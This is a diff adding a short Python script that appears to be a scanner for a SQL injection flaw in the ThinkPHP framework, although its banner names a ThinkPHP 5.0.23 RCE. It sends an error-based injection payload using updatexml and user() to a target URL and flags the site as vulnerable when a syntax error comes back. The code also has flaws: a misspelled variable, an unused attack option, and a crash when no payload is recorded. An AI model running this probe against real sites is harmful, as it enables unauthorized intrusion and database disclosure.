@@ -1,0 +1,49 @@
+import argparse
+import re
+import sys
+import urllib
+import requests
+
+def verify(url):
+    result = {
+        'name': 'in-sqlinjection',
+        'vulnerable': False,
+        'attack': False,
+    }
+    try:
+        target = urllib.parse.urljoin(url,'/index.php?ids[0,updatexml(0,concat(0xa,user()),0)]=1')
+        resopnse = requests.get(url=target)
+        if re.search(r'syntax error',resopnse.text):
+            result['vulnerable'] = True
+            result['attack'] = False
+            result['payload'] = target
+            return result
+    except:
+        return result
+
+
+def start_verify(self):
+    s2 = verify(self)
+    print(s2['name'] + str(' ' + str(s2['vulnerable'])))
+    print('payload: '+ s2['payload'])
+
+
+
+if __name__ == '__main__':
+    print('''--❤ tp5.0.23rce_scan ❤--''')
+
+parser = argparse.ArgumentParser(description='tp2rce')
+parser.add_argument('-url', type=str, help="输入目标链接")
+parser.add_argument('-attack', type=str, help='执行EXP')
+args = parser.parse_args()
+
+try:
+    if '-url' in sys.argv:
+        print('漏洞检测')
+        print()
+        start_verify(args.url)
+        print('此漏洞不支持进一步获取权限')
+        print()
+        print('漏洞检测结束')
+except:
+    pass
